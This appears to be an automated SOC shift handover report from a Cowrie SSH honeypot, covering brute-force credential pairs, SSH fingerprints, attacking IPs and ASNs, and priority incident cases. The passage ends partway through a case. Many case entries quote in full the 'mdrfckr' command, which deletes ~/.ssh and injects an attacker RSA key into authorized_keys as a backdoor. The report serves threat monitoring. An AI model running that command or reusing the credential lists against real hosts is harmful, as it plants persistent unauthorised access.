# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-02 |
| **Generated At** | 2026-05-02T16:55:15Z |
| **Shift Time** | 16:55 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **2038** |
| Confirmed Threats | **345** |
| False Positives Filtered | **1693** (83.1%) |
| Unique Attacker IPs | **39** |
| Countries of Origin | **20** |
| High Severity Cases | **40** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **1998** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **273** |
| Unique Credential Pairs | **142** |
| Unique Usernames | **66** |
| Unique Passwords | **127** |
| Successful Auth Pairs | **28** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 40 |
| `ubuntu` | 39 |
| `admin` | 25 |
| `345gs5662d34` | 20 |
| `test` | 13 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 20 |
| `3245gs5662d34` | 20 |
| `123456` | 12 |
| `9876543210` | 5 |
| `1q2w3e4r5t` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 20 |
| `root` | `3245gs5662d34` | 20 |
| `ubuntu` | `9876543210` | 5 |
| `server` | `1q2w3e4r5t` | 5 |
| `ubuntu` | `root@123` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin321` | `103.174.114.50` | 2026-05-02T15:08:48 |
| `root` | `3245gs5662d34` | `103.174.114.50` | 2026-05-02T15:08:54 |
| `root` | `serverpassword` | `103.174.114.50` | 2026-05-02T15:21:33 |
| `root` | `test666` | `187.62.87.27` | 2026-05-02T15:24:02 |
| `root` | `3245gs5662d34` | `187.62.87.27` | 2026-05-02T15:24:13 |
| `root` | `admin123.*` | `187.62.87.27` | 2026-05-02T15:25:41 |
| `root` | `oracle12345` | `187.62.87.27` | 2026-05-02T15:29:48 |
| `root` | `oracle12345` | `211.186.79.173` | 2026-05-02T15:29:53 |
| `root` | `3245gs5662d34` | `211.186.79.173` | 2026-05-02T15:29:57 |
| `root` | `test666` | `152.200.205.179` | 2026-05-02T15:32:30 |
| `root` | `3245gs5662d34` | `152.200.205.179` | 2026-05-02T15:32:37 |
| `root` | `admin123.*` | `152.200.205.179` | 2026-05-02T15:37:15 |
| `root` | `oracle12345` | `152.200.205.179` | 2026-05-02T15:38:16 |
| `root` | `test666` | `211.186.79.173` | 2026-05-02T15:47:03 |
| `root` | `admin123.*` | `211.186.79.173` | 2026-05-02T15:49:18 |
| `root` | `admin*123` | `43.163.107.154` | 2026-05-02T16:08:10 |
| `root` | `3245gs5662d34` | `43.163.107.154` | 2026-05-02T16:08:13 |
| `root` | `admin1@3` | `43.163.107.154` | 2026-05-02T16:11:15 |
| `root` | `admin1234*` | `43.163.107.154` | 2026-05-02T16:16:02 |
| `root` | `oracle12345` | `34.0.13.61` | 2026-05-02T16:17:47 |
| `root` | `3245gs5662d34` | `34.0.13.61` | 2026-05-02T16:17:49 |
| `root` | `digital1` | `197.199.224.52` | 2026-05-02T16:26:12 |
| `root` | `3245gs5662d34` | `197.199.224.52` | 2026-05-02T16:26:18 |
| `root` | `test666` | `34.0.13.61` | 2026-05-02T16:32:15 |
| `root` | `userroot` | `197.199.224.52` | 2026-05-02T16:36:39 |
| `root` | `admin11!!` | `14.63.198.239` | 2026-05-02T16:37:28 |
| `root` | `3245gs5662d34` | `14.63.198.239` | 2026-05-02T16:37:32 |
| `root` | `admin123.*` | `34.0.13.61` | 2026-05-02T16:50:01 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **2038** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 340 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 267 | 8 |
| `03a80b21afa8...` | Modern SSH client | 62 | 8 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 267 | 8 | libssh-based |
| `03a80b21afa8...` | libssh | 62 | 8 | Modern SSH client |
| `95420f9d932d...` | libssh | 11 | 3 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 20 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.163.107.154`, `103.174.114.50`, `187.62.87.27`, `14.63.198.239`, `34.0.13.61`, `152.200.205.179`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **39** |
| Unique ASNs | **33** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS263087` | Rawnet Informatica LTDA | 2 | LOW |
| `AS16276` | OVH SAS | 2 | MEDIUM |
| `AS211680` | NSEC - Sistemas Informaticos, S.A. | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | MEDIUM |
| `AS9009` | M247 Europe SRL | 1 | MEDIUM |
| `AS19527` | Google LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (40)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2f216cce0519

| Field | Detail |
|---|---|
| **Source IP** | `103.174.114[.]50` |
| **First Seen** | 2026-05-02 15:08 |
| **Last Seen** | 2026-05-02 15:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:08:47` | `cowrie.session.connect` |
| `2026-05-02 15:08:47` | `cowrie.client.version` |
| `2026-05-02 15:08:47` | `cowrie.client.kex` |
| `2026-05-02 15:08:48` | `cowrie.login.success` |
| `2026-05-02 15:08:49` | `cowrie.session.params` |
| `2026-05-02 15:08:49` | `cowrie.command.input` |
| `2026-05-02 15:08:49` | `cowrie.command.failed` |
| `2026-05-02 15:08:49` | `cowrie.log.closed` |
| `2026-05-02 15:08:49` | `cowrie.session.params` |
| `2026-05-02 15:08:49` | `cowrie.command.input` |
| `2026-05-02 15:08:50` | `cowrie.session.file_download` |
| `2026-05-02 15:08:50` | `cowrie.log.closed` |
| `2026-05-02 15:08:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.114[.]50` to AbuseIPDB if not already reported
- [ ] Block `103.174.114[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21fd16611108

| Field | Detail |
|---|---|
| **Source IP** | `103.174.114[.]50` |
| **First Seen** | 2026-05-02 15:08 |
| **Last Seen** | 2026-05-02 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:08:53` | `cowrie.session.connect` |
| `2026-05-02 15:08:53` | `cowrie.client.version` |
| `2026-05-02 15:08:53` | `cowrie.client.kex` |
| `2026-05-02 15:08:54` | `cowrie.login.success` |
| `2026-05-02 15:08:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.114[.]50` to AbuseIPDB if not already reported
- [ ] Block `103.174.114[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2286cbe4ea8

| Field | Detail |
|---|---|
| **Source IP** | `103.174.114[.]50` |
| **First Seen** | 2026-05-02 15:21 |
| **Last Seen** | 2026-05-02 15:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:21:32` | `cowrie.session.connect` |
| `2026-05-02 15:21:32` | `cowrie.client.version` |
| `2026-05-02 15:21:32` | `cowrie.client.kex` |
| `2026-05-02 15:21:33` | `cowrie.login.success` |
| `2026-05-02 15:21:34` | `cowrie.session.params` |
| `2026-05-02 15:21:34` | `cowrie.command.input` |
| `2026-05-02 15:21:34` | `cowrie.command.failed` |
| `2026-05-02 15:21:34` | `cowrie.log.closed` |
| `2026-05-02 15:21:35` | `cowrie.session.params` |
| `2026-05-02 15:21:35` | `cowrie.command.input` |
| `2026-05-02 15:21:35` | `cowrie.session.file_download` |
| `2026-05-02 15:21:35` | `cowrie.log.closed` |
| `2026-05-02 15:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.114[.]50` to AbuseIPDB if not already reported
- [ ] Block `103.174.114[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b580bb4df6f

| Field | Detail |
|---|---|
| **Source IP** | `103.174.114[.]50` |
| **First Seen** | 2026-05-02 15:21 |
| **Last Seen** | 2026-05-02 15:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:21:38` | `cowrie.session.connect` |
| `2026-05-02 15:21:39` | `cowrie.client.version` |
| `2026-05-02 15:21:39` | `cowrie.client.kex` |
| `2026-05-02 15:21:40` | `cowrie.login.success` |
| `2026-05-02 15:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.114[.]50` to AbuseIPDB if not already reported
- [ ] Block `103.174.114[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d0e161dfa9e

| Field | Detail |
|---|---|
| **Source IP** | `187.62.87[.]27` |
| **First Seen** | 2026-05-02 15:23 |
| **Last Seen** | 2026-05-02 15:24 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:23:59` | `cowrie.session.connect` |
| `2026-05-02 15:23:59` | `cowrie.client.version` |
| `2026-05-02 15:23:59` | `cowrie.client.kex` |
| `2026-05-02 15:24:02` | `cowrie.login.success` |
| `2026-05-02 15:24:03` | `cowrie.session.params` |
| `2026-05-02 15:24:03` | `cowrie.command.input` |
| `2026-05-02 15:24:03` | `cowrie.command.failed` |
| `2026-05-02 15:24:03` | `cowrie.log.closed` |
| `2026-05-02 15:24:04` | `cowrie.session.params` |
| `2026-05-02 15:24:04` | `cowrie.command.input` |
| `2026-05-02 15:24:04` | `cowrie.session.file_download` |
| `2026-05-02 15:24:04` | `cowrie.log.closed` |
| `2026-05-02 15:24:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.62.87[.]27` to AbuseIPDB if not already reported
- [ ] Block `187.62.87[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eb4cad60953

| Field | Detail |
|---|---|
| **Source IP** | `187.62.87[.]27` |
| **First Seen** | 2026-05-02 15:24 |
| **Last Seen** | 2026-05-02 15:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:24:11` | `cowrie.session.connect` |
| `2026-05-02 15:24:12` | `cowrie.client.version` |
| `2026-05-02 15:24:12` | `cowrie.client.kex` |
| `2026-05-02 15:24:13` | `cowrie.login.success` |
| `2026-05-02 15:24:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.62.87[.]27` to AbuseIPDB if not already reported
- [ ] Block `187.62.87[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d4e16ddb5ad

| Field | Detail |
|---|---|
| **Source IP** | `187.62.87[.]27` |
| **First Seen** | 2026-05-02 15:25 |
| **Last Seen** | 2026-05-02 15:25 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:25:39` | `cowrie.session.connect` |
| `2026-05-02 15:25:39` | `cowrie.client.version` |
| `2026-05-02 15:25:40` | `cowrie.client.kex` |
| `2026-05-02 15:25:41` | `cowrie.login.success` |
| `2026-05-02 15:25:41` | `cowrie.session.params` |
| `2026-05-02 15:25:41` | `cowrie.command.input` |
| `2026-05-02 15:25:41` | `cowrie.command.failed` |
| `2026-05-02 15:25:42` | `cowrie.log.closed` |
| `2026-05-02 15:25:43` | `cowrie.session.params` |
| `2026-05-02 15:25:43` | `cowrie.command.input` |
| `2026-05-02 15:25:43` | `cowrie.session.file_download` |
| `2026-05-02 15:25:43` | `cowrie.log.closed` |
| `2026-05-02 15:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.62.87[.]27` to AbuseIPDB if not already reported
- [ ] Block `187.62.87[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3340d09b9cc2

| Field | Detail |
|---|---|
| **Source IP** | `187.62.87[.]27` |
| **First Seen** | 2026-05-02 15:25 |
| **Last Seen** | 2026-05-02 15:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:25:49` | `cowrie.session.connect` |
| `2026-05-02 15:25:49` | `cowrie.client.version` |
| `2026-05-02 15:25:49` | `cowrie.client.kex` |
| `2026-05-02 15:25:51` | `cowrie.login.success` |
| `2026-05-02 15:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.62.87[.]27` to AbuseIPDB if not already reported
- [ ] Block `187.62.87[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58f92b2ade33

| Field | Detail |
|---|---|
| **Source IP** | `187.62.87[.]27` |
| **First Seen** | 2026-05-02 15:29 |
| **Last Seen** | 2026-05-02 15:29 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:29:47` | `cowrie.session.connect` |
| `2026-05-02 15:29:47` | `cowrie.client.version` |
| `2026-05-02 15:29:47` | `cowrie.client.kex` |
| `2026-05-02 15:29:48` | `cowrie.login.success` |
| `2026-05-02 15:29:49` | `cowrie.session.params` |
| `2026-05-02 15:29:49` | `cowrie.command.input` |
| `2026-05-02 15:29:49` | `cowrie.command.failed` |
| `2026-05-02 15:29:49` | `cowrie.log.closed` |
| `2026-05-02 15:29:50` | `cowrie.session.params` |
| `2026-05-02 15:29:50` | `cowrie.command.input` |
| `2026-05-02 15:29:50` | `cowrie.session.file_download` |
| `2026-05-02 15:29:50` | `cowrie.log.closed` |
| `2026-05-02 15:29:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.62.87[.]27` to AbuseIPDB if not already reported
- [ ] Block `187.62.87[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cacd3f560512

| Field | Detail |
|---|---|
| **Source IP** | `211.186.79[.]173` |
| **First Seen** | 2026-05-02 15:29 |
| **Last Seen** | 2026-05-02 15:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:29:52` | `cowrie.session.connect` |
| `2026-05-02 15:29:52` | `cowrie.client.version` |
| `2026-05-02 15:29:52` | `cowrie.client.kex` |
| `2026-05-02 15:29:53` | `cowrie.login.success` |
| `2026-05-02 15:29:53` | `cowrie.session.params` |
| `2026-05-02 15:29:53` | `cowrie.command.input` |
| `2026-05-02 15:29:53` | `cowrie.command.failed` |
| `2026-05-02 15:29:53` | `cowrie.log.closed` |
| `2026-05-02 15:29:54` | `cowrie.session.params` |
| `2026-05-02 15:29:54` | `cowrie.command.input` |
| `2026-05-02 15:29:54` | `cowrie.session.file_download` |
| `2026-05-02 15:29:54` | `cowrie.log.closed` |
| `2026-05-02 15:29:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.186.79[.]173` to AbuseIPDB if not already reported
- [ ] Block `211.186.79[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48ae57bd0111

| Field | Detail |
|---|---|
| **Source IP** | `187.62.87[.]27` |
| **First Seen** | 2026-05-02 15:29 |
| **Last Seen** | 2026-05-02 15:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:29:55` | `cowrie.session.connect` |
| `2026-05-02 15:29:55` | `cowrie.client.version` |
| `2026-05-02 15:29:56` | `cowrie.client.kex` |
| `2026-05-02 15:29:57` | `cowrie.login.success` |
| `2026-05-02 15:29:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.62.87[.]27` to AbuseIPDB if not already reported
- [ ] Block `187.62.87[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bde44fb741a

| Field | Detail |
|---|---|
| **Source IP** | `211.186.79[.]173` |
| **First Seen** | 2026-05-02 15:29 |
| **Last Seen** | 2026-05-02 15:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:29:56` | `cowrie.session.connect` |
| `2026-05-02 15:29:56` | `cowrie.client.version` |
| `2026-05-02 15:29:56` | `cowrie.client.kex` |
| `2026-05-02 15:29:57` | `cowrie.login.success` |
| `2026-05-02 15:29:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.186.79[.]173` to AbuseIPDB if not already reported
- [ ] Block `211.186.79[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cbd3589bdee

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]179` |
| **First Seen** | 2026-05-02 15:32 |
| **Last Seen** | 2026-05-02 15:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
